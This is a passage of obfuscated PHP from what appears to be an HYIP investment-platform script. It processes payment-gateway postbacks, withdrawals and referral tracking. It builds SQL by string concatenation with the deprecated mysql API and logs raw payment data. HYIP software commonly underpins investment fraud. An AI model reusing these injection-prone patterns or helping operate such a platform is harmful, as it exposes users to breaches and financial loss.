      $elnlcrUqv = sprintf ('%0.2f', $elnlcWodOE[$elnlcsyENS['elnlcVBQbW']]);
      $elnlcRMwb = sprintf ('%0.2f', $elnlcWodOE[$elnlcsyENS['elnlcNSjp']]);
      $elnlcVTlA = $elnlcWodOE[$elnlcsyENS['elnlcdKrq']];
      $elnlcOPfeJ = $elnlcWodOE[$elnlcsyENS['elnlcMhogt']];
      elnlcgrvzq (27, $elnlcOzjJ, $elnlcrUqv, $elnlcVTlA, $elnlcOPfeJ, $elnlcpazb, $elnlcRMwb);
      print 1;
      exit ();
    }
  }

  if ($elnlcWodOE[$elnlcsyENS['elnlcwWABC']] == $elnlcsyENS['elnlcbjVM'])
  {
    if (file_exists ('./tmpl_c/log_postbacks'))
    {
      $elnlcRIwA = fopen ('./tmpl_c/solidtrustpay.log', 'a+');
      foreach ($elnlcWodOE as $k => $v)
      {
        fwrite ($elnlcRIwA, ('' . $k . ' = ' . $v . '
'));
      }

      fwrite ($elnlcRIwA, ('' . 'mymd5 = ' . $elnlcSuVc[$elnlcsyENS['elnlcQNUtO']] . '
'));
      fwrite ($elnlcRIwA, '' . 'ip = ' . $elnlcUAAU[$elnlcsyENS['elnlcnGMB']] . '
----------

');
      fclose ($elnlcRIwA);
    }

    if ((($elnlcWodOE[$elnlcsyENS['elnlcPGeV']] == $elnlcsyENS['elnlcmrkgq'] OR $elnlcWodOE[$elnlcsyENS['elnlcwtCk']] != 'USD') OR $elnlcWodOE[$elnlcsyENS['elnlccotiB']] != 'COMPLETE'))
    {
      exit ();
    }

    list ($elnlckapu, $elnlcEabU) = explode ('-', $elnlcWodOE[$elnlcsyENS['elnlcvjyC']]);
    $elnlckapu = sprintf ('%d', $elnlckapu);
    if ($elnlcEabU == '')
    {
      $elnlcEabU = $elnlcsyENS['elnlcwatJ'];
    }

    $elnlcEabU = elnlcnczen ($elnlcEabU);
    $elnlcVTlA = elnlcnczen ($elnlcWodOE[$elnlcsyENS['elnlcifHx']]);
    $q = '' . 'select * from hm2_history where id = ' . $elnlckapu . ' and str = \'' . $elnlcEabU . '\' and type=\'withdraw_pending\'';
    $elnlchGkPU = mysql_query ($q);
    while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
    {
      $q = '' . 'delete from hm2_history where id = ' . $elnlckapu;
      (mysql_query ($q) OR print mysql_error ());
      $q = 'insert into hm2_history set 
		user_id = ' . $elnlcCgqPK[$elnlcsyENS['elnlcAvUq']] . ',
		amount = -' . abs ($elnlcCgqPK[$elnlcsyENS['elnlcyteO']]) . ('' . ',
		type = \'withdrawal\',
		description = \'Withdraw processed. Batch id = ' . $elnlcVTlA . '\',
		actual_amount = -') . abs ($elnlcCgqPK[$elnlcsyENS['elnlcyteO']]) . ',
		ec = 22,
		date = now()
	';
      (mysql_query ($q) OR print mysql_error ());
      $q = 'select * from hm2_users where id = ' . $elnlcCgqPK[$elnlcsyENS['elnlcAvUq']];
      $elnlchGkPU = mysql_query ($q);
      $elnlcgcnET = mysql_fetch_array ($elnlchGkPU);
      $elnlcRuFoK = array ();
      $elnlcRuFoK[$elnlcsyENS['elnlczWew']] = $elnlcgcnET[$elnlcsyENS['elnlczWew']];
      $elnlcRuFoK[$elnlcsyENS['elnlcmjdk']] = $elnlcgcnET[$elnlcsyENS['elnlcmjdk']];
      $elnlcRuFoK[$elnlcsyENS['elnlcyteO']] = sprintf ('%.02f', abs ($elnlcCgqPK[$elnlcsyENS['elnlcyteO']]));
      $elnlcRuFoK[$elnlcsyENS['elnlcJdSMq']] = $elnlcWodOE[$elnlcsyENS['elnlchWvu']];
      $elnlcRuFoK[$elnlcsyENS['elnlcwuPu']] = $elnlcVTlA;
      $elnlcRuFoK[$elnlcsyENS['elnlcKcCmd']] = $elnlcVTlA;
      $elnlcRuFoK[$elnlcsyENS['elnlcUIjSg']] = $elnlcVTlA;
      $elnlcRuFoK[$elnlcsyENS['elnlccefl']] = $elnlcGPfS[22][$elnlcsyENS['elnlcmjdk']];
      elnlcsius ('withdraw_user_notification', $elnlcgcnET[$elnlcsyENS['elnlcdktEr']], $elnlcSuVc[$elnlcsyENS['elnlcBpGlU']], $elnlcRuFoK);
    }

    print 1;
    elnlcnooln ($elnlcUazB);
    exit ();
  }

  if (((((($elnlcWodOE[$elnlcsyENS['elnlcAcDi']] != '' AND $elnlcWodOE[$elnlcsyENS['elnlcTeLjs']] != '') AND $elnlcWodOE[$elnlcsyENS['elnlcIbEt']] == $elnlcSuVc[$elnlcsyENS['elnlcUkga']]) AND $elnlcWodOE[$elnlcsyENS['elnlcBkyI']] == $elnlcSuVc[$elnlcsyENS['elnlcEzVS']]) AND $elnlcWodOE[$elnlcsyENS['elnlcxxLz']] == $elnlcsyENS['elnlcNORT']) AND $elnlcGPfS[15][$elnlcsyENS['elnlccotiB']] == 1))
  {
    $elnlckjze = $elnlcSuVc[$elnlcsyENS['elnlcKhST']];
    $elnlclOmK = strtoupper (elnlcptwmv ($elnlcWodOE[$elnlcsyENS['elnlcAcDi']] . ':' . $elnlcWodOE[$elnlcsyENS['elnlcpaBvw']] . ':' . $elnlcSuVc[$elnlcsyENS['elnlcEzVS']] . ':' . $elnlcWodOE[$elnlcsyENS['elnlcTdkdR']] . ':' . $elnlcWodOE[$elnlcsyENS['elnlcfWmaV']] . ':' . $elnlcWodOE[$elnlcsyENS['elnlcIbEt']] . ':' . $elnlckjze));
    if ($elnlclOmK == $elnlcWodOE[$elnlcsyENS['elnlcTeLjs']])
    {
      $elnlcOzjJ = sprintf ('%d', $elnlcWodOE[$elnlcsyENS['elnlcndvUu']]);
      $elnlcrUqv = abs ($elnlcWodOE[$elnlcsyENS['elnlcTdkdR']]);
      $elnlcVTlA = $elnlcWodOE[$elnlcsyENS['elnlcfWmaV']];
      $elnlcOPfeJ = $elnlcWodOE[$elnlcsyENS['elnlcpaBvw']];
      if ($elnlcrUqv == $elnlcSuVc[$elnlcsyENS['elnlcCeipo']])
      {
        $q = '' . 'update hm2_users set reg_fee = ' . $elnlcrUqv . ' where id = ' . $elnlcOzjJ;
        (mysql_query ($q) OR print mysql_error ());
      }
    }

    print 1;
    exit ();
  }

  if ($elnlcWodOE[$elnlcsyENS['elnlcxAng']] != '')
  {
    if (file_exists ('./tmpl_c/log_postbacks'))
    {
      $elnlcRIwA = fopen ('./tmpl_c/wm.log', 'a+');
      foreach ($elnlcWodOE as $k => $v)
      {
        fwrite ($elnlcRIwA, ('' . $k . ' = ' . $v . '
'));
      }

      fwrite ($elnlcRIwA, ('' . 'mymd5 = ' . $elnlcSuVc[$elnlcsyENS['elnlcpyGW']] . '
'));
      fwrite ($elnlcRIwA, '' . 'ip = ' . $elnlcUAAU[$elnlcsyENS['elnlcnGMB']] . '
----------

');
      fclose ($elnlcRIwA);
    }

    if ($elnlcWodOE[$elnlcsyENS['elnlcdTNBq']] == 1)
    {
      exit ();
    }

    if (strlen ($elnlcWodOE[$elnlcsyENS['elnlcluWTj']]) != 13)
    {
      exit ();
    }

    $elnlcrUqv = sprintf ('%0.2f', $elnlcWodOE[$elnlcsyENS['elnlcKFMO']]);
    $elnlcpHmBE = $elnlcSuVc[$elnlcsyENS['elnlcpyGW']];
    $elnlclOmK = strtoupper (md5 ($elnlcWodOE[$elnlcsyENS['elnlcxAng']] . $elnlcrUqv . $elnlcWodOE[$elnlcsyENS['elnlcxzsG']] . $elnlcWodOE[$elnlcsyENS['elnlcUSeG']] . $elnlcWodOE[$elnlcsyENS['elnlcnzflb']] . $elnlcWodOE[$elnlcsyENS['elnlcChDsc']] . $elnlcWodOE[$elnlcsyENS['elnlcLtrkH']] . $elnlcpHmBE . $elnlcWodOE[$elnlcsyENS['elnlcluWTj']] . $elnlcWodOE[$elnlcsyENS['elnlcHIikI']]));
    if ($elnlclOmK == $elnlcWodOE[$elnlcsyENS['elnlcBtneh']])
    {
      $elnlciqiq = elnlcqsjub ($elnlcWodOE[$elnlcsyENS['elnlcAEyB']], 1);
      $elnlcWodOE = array_merge ($elnlcWodOE, $elnlciqiq);
      $elnlcOzjJ = sprintf ('%d', $elnlcWodOE[$elnlcsyENS['elnlcndvUu']]);
      $elnlcpazb = sprintf ('%d', $elnlcWodOE[$elnlcsyENS['elnlccaNg']]);
      elnlcgrvzq (20, $elnlcOzjJ, $elnlcrUqv, $elnlcVTlA, $elnlcOPfeJ, $elnlcpazb, $elnlcRMwb);
      exit ();
    }
  }

  if ((($elnlcWodOE[$elnlcsyENS['elnlcjMxze']] == $elnlcsyENS['elnlcTeAyR'] AND $elnlcWodOE[$elnlcsyENS['elnlcxAdnS']] != '') AND $elnlcGPfS[16][$elnlcsyENS['elnlccotiB']] == 1))
  {
    $elnlckjze = $elnlcSuVc[$elnlcsyENS['elnlcpbVHp']];
    $elnlcWodOE[$elnlcsyENS['elnlcFxKlw']] = $elnlcSuVc[$elnlcsyENS['elnlcahbUH']];
    $elnlclOmK = strtolower (md5 ($elnlcWodOE[$elnlcsyENS['elnlcFxKlw']] . ';' . $elnlcWodOE[$elnlcsyENS['elnlcLcmnu']] . ';' . $elnlcWodOE[$elnlcsyENS['elnlcJPKy']] . ';' . $elnlcWodOE[$elnlcsyENS['elnlcrTWnV']] . ';' . $elnlcWodOE[$elnlcsyENS['elnlcmMMS']] . ';' . $elnlckjze));
    if ($elnlclOmK == strtolower ($elnlcWodOE[$elnlcsyENS['elnlcxAdnS']]))
    {
      $elnlcOzjJ = sprintf ('%d', $elnlcWodOE[$elnlcsyENS['elnlcGCjMC']]);
      $elnlcpazb = sprintf ('%d', $elnlcWodOE[$elnlcsyENS['elnlcsKwu']]);
      $elnlcRMwb = sprintf ('%d', $elnlcWodOE[$elnlcsyENS['elnlcvGrh']]);
      $elnlcrUqv = $elnlcWodOE[$elnlcsyENS['elnlcJPKy']];
      $elnlcVTlA = $elnlcWodOE[$elnlcsyENS['elnlcrTWnV']];
      $elnlcOPfeJ = $elnlcWodOE[$elnlcsyENS['elnlcLcmnu']];
      elnlcgrvzq (16, $elnlcOzjJ, $elnlcrUqv, $elnlcVTlA, $elnlcOPfeJ, $elnlcpazb, $elnlcRMwb);
    }

    print 1;
    exit ();
  }

  if ((($elnlcWodOE[$elnlcsyENS['elnlcjMxze']] == $elnlcsyENS['elnlcjROJ'] AND $elnlcWodOE[$elnlcsyENS['elnlcxAdnS']] != '') AND $elnlcGPfS[16][$elnlcsyENS['elnlccotiB']] == 1))
  {
    $elnlckjze = $elnlcSuVc[$elnlcsyENS['elnlcpbVHp']];
    $elnlcWodOE[$elnlcsyENS['elnlcFxKlw']] = $elnlcSuVc[$elnlcsyENS['elnlcahbUH']];
    $elnlclOmK = strtolower (md5 ($elnlcWodOE[$elnlcsyENS['elnlcFxKlw']] . ';' . $elnlcWodOE[$elnlcsyENS['elnlcLcmnu']] . ';' . $elnlcWodOE[$elnlcsyENS['elnlcJPKy']] . ';' . $elnlcWodOE[$elnlcsyENS['elnlcrTWnV']] . ';' . $elnlcWodOE[$elnlcsyENS['elnlcmMMS']] . ';' . $elnlckjze));
    if ($elnlclOmK == strtolower ($elnlcWodOE[$elnlcsyENS['elnlcxAdnS']]))
    {
      $elnlcOzjJ = sprintf ('%d', $elnlcWodOE[$elnlcsyENS['elnlcGCjMC']]);
      $elnlcpazb = sprintf ('%d', $elnlcWodOE[$elnlcsyENS['elnlcsKwu']]);
      $elnlcRMwb = sprintf ('%d', $elnlcWodOE[$elnlcsyENS['elnlcvGrh']]);
      $elnlcrUqv = $elnlcWodOE[$elnlcsyENS['elnlcJPKy']];
      $elnlcVTlA = $elnlcWodOE[$elnlcsyENS['elnlcrTWnV']];
      $elnlcOPfeJ = $elnlcWodOE[$elnlcsyENS['elnlcLcmnu']];
      if ($elnlcrUqv == $elnlcSuVc[$elnlcsyENS['elnlcCeipo']])
      {
        $q = '' . 'update hm2_users set reg_fee = ' . $elnlcrUqv . ' where id = ' . $elnlcOzjJ;
        (mysql_query ($q) OR print mysql_error ());
      }
    }

    print 1;
    exit ();
  }

  if (($elnlcWodOE[$elnlcsyENS['elnlcxxLz']] == $elnlcsyENS['elnlcRdzs'] AND $elnlcGPfS[24][$elnlcsyENS['elnlccotiB']] == 1))
  {
    if (file_exists ('./tmpl_c/log_postbacks'))
    {
      $elnlcRIwA = fopen ('./tmpl_c/evowallet.log', 'a+');
      foreach ($elnlcWodOE as $k => $v)
      {
        fwrite ($elnlcRIwA, ('' . $k . ' = ' . $v . '
'));
      }

      fwrite ($elnlcRIwA, ('' . 'mymd5 = ' . $elnlcSuVc[$elnlcsyENS['elnlconCsk']] . '
'));
      fwrite ($elnlcRIwA, '' . 'ip = ' . $elnlcUAAU[$elnlcsyENS['elnlcnGMB']] . '
----------

');
      fclose ($elnlcRIwA);
    }

    $elnlckjze = strtolower (md5 ($elnlcSuVc[$elnlcsyENS['elnlconCsk']]));
    $elnlclOmK = strtoupper (md5 ($elnlcWodOE[$elnlcsyENS['elnlcJpjbE']] . ':' . $elnlcWodOE[$elnlcsyENS['elnlcBABc']] . ':' . $elnlcWodOE[$elnlcsyENS['elnlcbqzMJ']] . ':' . $elnlcWodOE[$elnlcsyENS['elnlcmOkw']] . ':' . $elnlcWodOE[$elnlcsyENS['elnlcHuNC']] . ':' . $elnlcWodOE[$elnlcsyENS['elnlcPfbm']] . ':' . $elnlckjze));
    if (($elnlclOmK == strtoupper ($elnlcWodOE[$elnlcsyENS['elnlcBChWl']]) AND $elnlcWodOE[$elnlcsyENS['elnlcmOkw']] == $elnlcsyENS['elnlcOPUx']))
    {
      $elnlcrUqv = $elnlcWodOE[$elnlcsyENS['elnlcbqzMJ']];
      $elnlcVTlA = $elnlcWodOE[$elnlcsyENS['elnlcHuNC']];
      $elnlcOPfeJ = $elnlcWodOE[$elnlcsyENS['elnlcJpjbE']];
      $elnlciqiq = elnlcqsjub ($elnlcWodOE[$elnlcsyENS['elnlcAEyB']], 1);
      $elnlcWodOE = array_merge ($elnlcWodOE, $elnlciqiq);
      $elnlcOzjJ = sprintf ('%d', $elnlcWodOE[$elnlcsyENS['elnlcndvUu']]);
      $elnlcpazb = sprintf ('%d', $elnlcWodOE[$elnlcsyENS['elnlccaNg']]);
      elnlcgrvzq (24, $elnlcOzjJ, $elnlcrUqv, $elnlcVTlA, $elnlcOPfeJ, $elnlcpazb, $elnlcRMwb);
    }

    print 1;
    exit ();
  }

  if ((($elnlcWodOE[$elnlcsyENS['elnlcxxLz']] == $elnlcsyENS['elnlcmhFIf'] AND 0 < $elnlcWodOE[$elnlcsyENS['elnlcbqzMJ']]) AND 0 < $elnlcWodOE[$elnlcsyENS['elnlcHuNC']]))
  {
    if (file_exists ('./tmpl_c/log_postbacks'))
    {
      $elnlcRIwA = fopen ('./tmpl_c/evowallet.log', 'a+');
      foreach ($elnlcWodOE as $k => $v)
      {
        fwrite ($elnlcRIwA, ('' . $k . ' = ' . $v . '
'));
      }

      fwrite ($elnlcRIwA, '' . 'ip = ' . $elnlcUAAU[$elnlcsyENS['elnlcnGMB']] . '
----------

');
      fclose ($elnlcRIwA);
    }

    list ($elnlckapu, $elnlcEabU) = explode ('-', $elnlcWodOE[$elnlcsyENS['elnlcBDKLP']]);
    $elnlckapu = sprintf ('%d', $elnlckapu);
    if ($elnlcEabU == '')
    {
      $elnlcEabU = $elnlcsyENS['elnlcwatJ'];
    }

    $elnlcEabU = elnlcnczen ($elnlcEabU);
    $elnlcVTlA = elnlcnczen ($elnlcWodOE[$elnlcsyENS['elnlcHuNC']]);
    $q = '' . 'select * from hm2_history where id = ' . $elnlckapu . ' and str = \'' . $elnlcEabU . '\' and type=\'withdraw_pending\'';
    $elnlchGkPU = mysql_query ($q);
    while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
    {
      $q = '' . 'delete from hm2_history where id = ' . $elnlckapu;
      (mysql_query ($q) OR print mysql_error ());
      $q = 'insert into hm2_history set 
    	user_id = ' . $elnlcCgqPK[$elnlcsyENS['elnlcAvUq']] . ',
    	amount = -' . abs ($elnlcCgqPK[$elnlcsyENS['elnlcyteO']]) . ('' . ',
    	type = \'withdrawal\',
    	description = \'Withdraw processed. Batch id = ' . $elnlcVTlA . '\',
    	actual_amount = -') . abs ($elnlcCgqPK[$elnlcsyENS['elnlcyteO']]) . ',
    	ec = 24,
    	date = now()
    ';
      (mysql_query ($q) OR print mysql_error ());
      $q = 'select * from hm2_users where id = ' . $elnlcCgqPK[$elnlcsyENS['elnlcAvUq']];
      $elnlchGkPU = mysql_query ($q);
      $elnlcgcnET = mysql_fetch_array ($elnlchGkPU);
      $elnlcRuFoK = array ();
      $elnlcRuFoK[$elnlcsyENS['elnlczWew']] = $elnlcgcnET[$elnlcsyENS['elnlczWew']];
      $elnlcRuFoK[$elnlcsyENS['elnlcmjdk']] = $elnlcgcnET[$elnlcsyENS['elnlcmjdk']];
      $elnlcRuFoK[$elnlcsyENS['elnlcyteO']] = sprintf ('%.02f', abs ($elnlcCgqPK[$elnlcsyENS['elnlcyteO']]));
      $elnlcRuFoK[$elnlcsyENS['elnlcJdSMq']] = $elnlcWodOE[$elnlcsyENS['elnlchWvu']];
      $elnlcRuFoK[$elnlcsyENS['elnlcwuPu']] = $elnlcVTlA;
      $elnlcRuFoK[$elnlcsyENS['elnlcKcCmd']] = $elnlcVTlA;
      $elnlcRuFoK[$elnlcsyENS['elnlcUIjSg']] = $elnlcVTlA;
      $elnlcRuFoK[$elnlcsyENS['elnlccefl']] = $elnlcGPfS[24][$elnlcsyENS['elnlcmjdk']];
      elnlcsius ('withdraw_user_notification', $elnlcgcnET[$elnlcsyENS['elnlcdktEr']], $elnlcSuVc[$elnlcsyENS['elnlcBpGlU']], $elnlcRuFoK);
    }

    print 1;
    elnlcnooln ($elnlcUazB);
    exit ();
  }

  if (($elnlcWodOE[$elnlcsyENS['elnlcfaVLO']] == $elnlcsyENS['elnlcfGtiT'] AND $elnlcGPfS[26][$elnlcsyENS['elnlccotiB']] == 1))
  {
    if (file_exists ('./tmpl_c/log_postbacks'))
    {
      $elnlcRIwA = fopen ('./tmpl_c/routepay.log', 'a+');
      foreach ($elnlcWodOE as $k => $v)
      {
        fwrite ($elnlcRIwA, ('' . $k . ' = ' . $v . '
'));
      }

      fwrite ($elnlcRIwA, ('' . 'mymd5 = ' . $elnlcSuVc[$elnlcsyENS['elnlcqsAWS']] . '
'));
      fwrite ($elnlcRIwA, '' . 'ip = ' . $elnlcUAAU[$elnlcsyENS['elnlcnGMB']] . '
----------

');
      fclose ($elnlcRIwA);
    }

    $elnlckjze = $elnlcSuVc[$elnlcsyENS['elnlcqsAWS']];
    $elnlclOmK = strtolower (md5 ($elnlcWodOE[$elnlcsyENS['elnlcnkDe']] . ':' . $elnlcWodOE[$elnlcsyENS['elnlcvbJj']] . ':' . $elnlcWodOE[$elnlcsyENS['elnlcNQaFf']] . ':' . $elnlcWodOE[$elnlcsyENS['elnlccFgw']] . ':' . $elnlcWodOE[$elnlcsyENS['elnlcjRtk']] . ':' . $elnlcWodOE[$elnlcsyENS['elnlczbMtS']] . ':' . $elnlckjze));
    if (($elnlclOmK == strtolower ($elnlcWodOE[$elnlcsyENS['elnlcRrjy']]) AND $elnlcWodOE[$elnlcsyENS['elnlccFgw']] == $elnlcsyENS['elnlcOPUx']))
    {
      $elnlcrUqv = $elnlcWodOE[$elnlcsyENS['elnlcNQaFf']];
      $elnlcVTlA = $elnlcWodOE[$elnlcsyENS['elnlczbMtS']];
      $elnlcOPfeJ = $elnlcWodOE[$elnlcsyENS['elnlcvbJj']];
      $elnlciqiq = elnlcqsjub ($elnlcWodOE[$elnlcsyENS['elnlcIjIc']], 1);
      $elnlcWodOE = array_merge ($elnlcWodOE, $elnlciqiq);
      $elnlcOzjJ = sprintf ('%d', $elnlcWodOE[$elnlcsyENS['elnlcndvUu']]);
      $elnlcpazb = sprintf ('%d', $elnlcWodOE[$elnlcsyENS['elnlccaNg']]);
      elnlcgrvzq (26, $elnlcOzjJ, $elnlcrUqv, $elnlcVTlA, $elnlcOPfeJ, $elnlcpazb, $elnlcRMwb);
    }

    print 1;
    exit ();
  }

  if ((($elnlcWodOE[$elnlcsyENS['elnlcfaVLO']] == $elnlcsyENS['elnlceDOd'] AND 0 < $elnlcWodOE[$elnlcsyENS['elnlcNQaFf']]) AND 0 < $elnlcWodOE[$elnlcsyENS['elnlczbMtS']]))
  {
    if (file_exists ('./tmpl_c/log_postbacks'))
    {
      $elnlcRIwA = fopen ('./tmpl_c/routepay.log', 'a+');
      foreach ($elnlcWodOE as $k => $v)
      {
        fwrite ($elnlcRIwA, ('' . $k . ' = ' . $v . '
'));
      }

      fwrite ($elnlcRIwA, '' . 'ip = ' . $elnlcUAAU[$elnlcsyENS['elnlcnGMB']] . '
----------

');
      fclose ($elnlcRIwA);
    }

    list ($elnlckapu, $elnlcEabU) = explode ('-', $elnlcWodOE[$elnlcsyENS['elnlcIjIc']]);
    $elnlckapu = sprintf ('%d', $elnlckapu);
    if ($elnlcEabU == '')
    {
      $elnlcEabU = $elnlcsyENS['elnlcwatJ'];
    }

    $elnlcEabU = elnlcnczen ($elnlcEabU);
    $elnlcVTlA = elnlcnczen ($elnlcWodOE[$elnlcsyENS['elnlczbMtS']]);
    $q = '' . 'select * from hm2_history where id = ' . $elnlckapu . ' and str = \'' . $elnlcEabU . '\' and type=\'withdraw_pending\'';
    $elnlchGkPU = mysql_query ($q);
    while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
    {
      $q = '' . 'delete from hm2_history where id = ' . $elnlckapu;
      (mysql_query ($q) OR print mysql_error ());
      $q = 'insert into hm2_history set 
    	user_id = ' . $elnlcCgqPK[$elnlcsyENS['elnlcAvUq']] . ',
    	amount = -' . abs ($elnlcCgqPK[$elnlcsyENS['elnlcyteO']]) . ('' . ',
    	type = \'withdrawal\',
    	description = \'Withdraw processed. Batch id = ' . $elnlcVTlA . '\',
    	actual_amount = -') . abs ($elnlcCgqPK[$elnlcsyENS['elnlcyteO']]) . ',
    	ec = 26,
    	date = now()
    ';
      (mysql_query ($q) OR print mysql_error ());
      $q = 'select * from hm2_users where id = ' . $elnlcCgqPK[$elnlcsyENS['elnlcAvUq']];
      $elnlchGkPU = mysql_query ($q);
      $elnlcgcnET = mysql_fetch_array ($elnlchGkPU);
      $elnlcRuFoK = array ();
      $elnlcRuFoK[$elnlcsyENS['elnlczWew']] = $elnlcgcnET[$elnlcsyENS['elnlczWew']];
      $elnlcRuFoK[$elnlcsyENS['elnlcmjdk']] = $elnlcgcnET[$elnlcsyENS['elnlcmjdk']];
      $elnlcRuFoK[$elnlcsyENS['elnlcyteO']] = sprintf ('%.02f', abs ($elnlcCgqPK[$elnlcsyENS['elnlcyteO']]));
      $elnlcRuFoK[$elnlcsyENS['elnlcJdSMq']] = $elnlcWodOE[$elnlcsyENS['elnlcnkDe']];
      $elnlcRuFoK[$elnlcsyENS['elnlcwuPu']] = $elnlcVTlA;
      $elnlcRuFoK[$elnlcsyENS['elnlcKcCmd']] = $elnlcVTlA;
      $elnlcRuFoK[$elnlcsyENS['elnlcUIjSg']] = $elnlcVTlA;
      $elnlcRuFoK[$elnlcsyENS['elnlccefl']] = $elnlcGPfS[26][$elnlcsyENS['elnlcmjdk']];
      elnlcsius ('withdraw_user_notification', $elnlcgcnET[$elnlcsyENS['elnlcdktEr']], $elnlcSuVc[$elnlcsyENS['elnlcBpGlU']], $elnlcRuFoK);
    }

    print 1;
    elnlcnooln ($elnlcUazB);
    exit ();
  }

  if ($elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlcEbpr'])
  {
    $elnlcWodOE[$elnlcsyENS['elnlckGUEd']] = $elnlcWodOE[$elnlcsyENS['elnlcTddU']];
  }

  if ($elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlcMTWKT'])
  {
    $elnlcWodOE[$elnlcsyENS['elnlckGUEd']] = $elnlcWodOE[$elnlcsyENS['elnlcTddU']];
  }

  if ($elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlcikSD'])
  {
    $elnlcWodOE[$elnlcsyENS['elnlckGUEd']] = $elnlcWodOE[$elnlcsyENS['elnlcGftJp']];
  }

  if ($elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlcEuerH'])
  {
    $elnlcWodOE[$elnlcsyENS['elnlckGUEd']] = $elnlcWodOE[$elnlcsyENS['elnlcpSRU']];
  }

  if ($elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlcpBvNJ'])
  {
    $elnlcFjFp = intval ($elnlcWodOE[$elnlcsyENS['elnlcgbwp']]);
    $q = '' . 'select username from hm2_users where id = ' . $elnlcFjFp;
    ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
    while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
    {
      $elnlcWodOE[$elnlcsyENS['elnlckGUEd']] = $elnlcCgqPK[$elnlcsyENS['elnlczWew']];
    }
  }

  if ($elnlcWodOE[$elnlcsyENS['elnlckGUEd']] != '')
  {
    if (strtolower ($elnlcRuyj[$elnlcsyENS['elnlcEUdte']]) != 'hothyips')
    {
      setcookie ('Referer', $elnlcWodOE[$elnlcsyENS['elnlckGUEd']], time () + 630720000);
      $_SESSION[$elnlcsyENS['elnlcEUdte']] = $elnlcWodOE[$elnlcsyENS['elnlckGUEd']];
      if ($elnlcRuyj[$elnlcsyENS['elnlcEUdte']] == '')
      {
        $elnlcFjFp = elnlcnczen ($elnlcWodOE[$elnlcsyENS['elnlckGUEd']]);
        $q = '' . 'select id from hm2_users where username = \'' . $elnlcFjFp . '\' and username <> \'\'';
        ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
        while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
        {
          $elnlcyEGMG = $elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']];
          $q = '' . 'select * from hm2_referal_stats where date = current_date() and user_id = ' . $elnlcyEGMG;
          ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
          $f = $elnlcsyENS['elnlcmjUx'];
          while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
          {
            $f = $elnlcsyENS['elnlctNxTK'];
          }

          if ($f == 0)
          {
            $q = '' . 'insert into hm2_referal_stats set date = current_date(), user_id = ' . $elnlcyEGMG . ', income = 1, reg = 0';
            $elnlchGkPU = mysql_query ($q);
          }
          else
          {
            $q = '' . 'update hm2_referal_stats set income = income+1 where date = current_date() and user_id = ' . $elnlcyEGMG . ' ';
            $elnlchGkPU = mysql_query ($q);
          }

          break;
        }
      }
    }

    if ($elnlcSuVc[$elnlcsyENS['elnlcndaSx']] != '')
    {
      header ('Location: ' . $elnlcSuVc[$elnlcsyENS['elnlcndaSx']]);
      elnlcnooln ($elnlcUazB);
      exit ();
    }
  }

  if ((!$elnlcUAAU[$elnlcsyENS['elnlcEcuR']] AND $elnlcSuVc[$elnlcsyENS['elnlcsEqy']] == 1))
  {
    $elnlcJxPsF = 'https://' . $elnlcUAAU[$elnlcsyENS['elnlcKJsh']] . $elnlcUAAU[$elnlcsyENS['elnlcebBfR']];
    if ($elnlcyNWy[$elnlcsyENS['elnlcVGta']])
    {
      $elnlcJxPsF .= $elnlcyNWy[$elnlcsyENS['elnlcVGta']];
    }

    header ('' . 'Location: ' . $elnlcJxPsF);
    exit ();
  }

  $q = 'select * from hm2_processings';
  ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
  while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
  {
    $elnlcWylzj = strtolower ($elnlcCgqPK[$elnlcsyENS['elnlcmjdk']]);
    $elnlcWylzj = preg_replace ('/([^\\w])/', '_', $elnlcWylzj);
    $elnlcGPfS[$elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']]] = array ('name' => $elnlcCgqPK[$elnlcsyENS['elnlcmjdk']], 'sfx' => $elnlcWylzj, status => $elnlcCgqPK[$elnlcsyENS['elnlccotiB']], 'has_account' => 0);
  }

  if (($elnlcWodOE[$elnlcsyENS['elnlcmeAr']] == $elnlcsyENS['elnlctesEb'] AND $elnlcWodOE[$elnlcsyENS['elnlcRCsD']] != ''))
  {
    $elnlcVTlA = elnlcnczen ($elnlcWodOE[$elnlcsyENS['elnlcRCsD']]);
    list ($elnlckapu, $elnlcEabU) = explode ('-', $elnlcWodOE[$elnlcsyENS['elnlcrHmeD']]);
    $elnlckapu = sprintf ('%d', $elnlckapu);
    if ($elnlcEabU == '')
    {
      $elnlcEabU = $elnlcsyENS['elnlcwatJ'];
    }

    $elnlcEabU = elnlcnczen ($elnlcEabU);
    $q = '' . 'select * from hm2_history where id = ' . $elnlckapu . ' and str = \'' . $elnlcEabU . '\' and type=\'withdraw_pending\'';
    $elnlchGkPU = mysql_query ($q);
    while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
    {
      $q = '' . 'delete from hm2_history where id = ' . $elnlckapu;
      (mysql_query ($q) OR print mysql_error ());
      $q = 'insert into hm2_history set 
	user_id = ' . $elnlcCgqPK[$elnlcsyENS['elnlcAvUq']] . ',
	amount = -' . abs ($elnlcCgqPK[$elnlcsyENS['elnlcyteO']]) . ('' . ',
	type = \'withdrawal\',
	description = \'Withdraw processed. Batch id = ' . $elnlcVTlA . '\',
	actual_amount = -') . abs ($elnlcCgqPK[$elnlcsyENS['elnlcyteO']]) . ',
	ec = 8,
	date = now()
	';
      (mysql_query ($q) OR print mysql_error ());
      $q = 'select * from hm2_users where id = ' . $elnlcCgqPK[$elnlcsyENS['elnlcAvUq']];
      $elnlchGkPU = mysql_query ($q);
      $elnlcgcnET = mysql_fetch_array ($elnlchGkPU);
